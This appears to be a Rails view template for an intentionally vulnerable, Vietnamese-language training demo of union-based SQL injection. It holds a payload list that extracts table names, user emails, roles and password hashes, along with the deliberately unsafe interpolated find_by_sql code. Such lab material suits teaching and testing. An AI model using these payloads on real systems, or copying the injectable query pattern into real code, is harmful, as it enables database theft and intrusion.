<div class="container mt-4">
  <h2>Union-based SQL Injection Demo</h2>
  <div class="alert alert-danger">
    <strong>Cực kỳ nguy hiểm:</strong> Có thể trích xuất toàn bộ database!
  </div>

  <div class="row">
    <div class="col-md-6">
      <h4>Event Search (Vulnerable)</h4>
      <%= form_with url: sqli_union_demo_path, method: :get, local: true, class: "border p-3 bg-light" do |f| %>
        <div class="mb-3">
          <%= f.label :search, "Search Events:", class: "form-label" %>
          <%= f.text_field :search, class: "form-control", 
                          placeholder: "Thử: ' UNION SELECT id,email,role FROM users--" %>
        </div>
        <%= f.submit "Search", class: "btn btn-primary" %>
      <% end %>
      
      <% if defined?(@events) %>
        <div class="mt-3">
          <h5>Kết quả tìm kiếm:</h5>
          <% if @events.any? %>
            <% @events.each do |event| %>
              <div class="card mb-2">
                <div class="card-body">
                  <h6 class="card-title">ID: <%= event.id %></h6>
                  <p class="card-text">
                    <strong>Title:</strong> <%= event.title %><br>
                    <strong>Description:</strong> <%= event.description %>
                  </p>
                </div>
              </div>
            <% end %>
          <% else %>
            <div class="alert alert-info">Không tìm thấy event nào</div>
          <% end %>
        </div>
      <% end %>
    </div>
    
    <div class="col-md-6">
      <h4>Union-based Payloads:</h4>
      <div class="list-group">
        <div class="list-group-item">
          <strong>Test số cột:</strong><br>
          <code>' UNION SELECT NULL,NULL,NULL--</code>
        </div>
        
        <div class="list-group-item">
          <strong>Lấy version & database:</strong><br>
          <code>' UNION SELECT 1,@@version,database()--</code>
        </div>
        
        <div class="list-group-item">
          <strong>Lấy tên bảng:</strong><br>
          <code>' UNION SELECT 1,table_name,'table' FROM information_schema.tables--</code>
        </div>
        
        <div class="list-group-item">
          <strong>Lấy thông tin users:</strong><br>
          <code>' UNION SELECT id,email,role FROM users--</code>
        </div>
        
        <div class="list-group-item">
          <strong>Lấy password hash:</strong><br>
          <code>' UNION SELECT id,email,password_digest FROM users--</code>
        </div>
        
        <div class="list-group-item">
          <strong>Lấy admin users:</strong><br>
          <code>' UNION SELECT id,email,role FROM users WHERE role='admin'--</code>
        </div>
      </div>
    </div>
  </div>
  
  <div class="mt-4">
    <h4>Code vulnerable:</h4>
    <pre class="bg-dark text-light p-3"><code>search_term = params[:search]
sql = "SELECT id, title, description FROM events WHERE title LIKE '%#{search_term}%'"
@events = Event.find_by_sql(sql)</code></pre>
  </div>
  
  <div class="mt-3">
    <h4>Ví dụ SQL được tạo ra:</h4>
    <pre class="bg-warning p-3"><code>SELECT id, title, description FROM events WHERE title LIKE '%' UNION SELECT id,email,role FROM users--%'</code></pre>
  </div>
  
  <div class="mt-3 alert alert-info">
    <strong>Các bước tấn công Union-based SQLi:</strong>
    <ol>
      <li><strong>Xác định số cột:</strong> Test với NULL,NULL,NULL...</li>
      <li><strong>Xác định kiểu dữ liệu:</strong> Test với 1,'string','string'...</li>
      <li><strong>Lấy thông tin hệ thống:</strong> @@version, database(), user()...</li>
      <li><strong>Lấy cấu trúc DB:</strong> information_schema.tables, columns...</li>
      <li><strong>Trích xuất dữ liệu:</strong> SELECT từ các bảng quan trọng</li>
    </ol>
  </div>
</div>
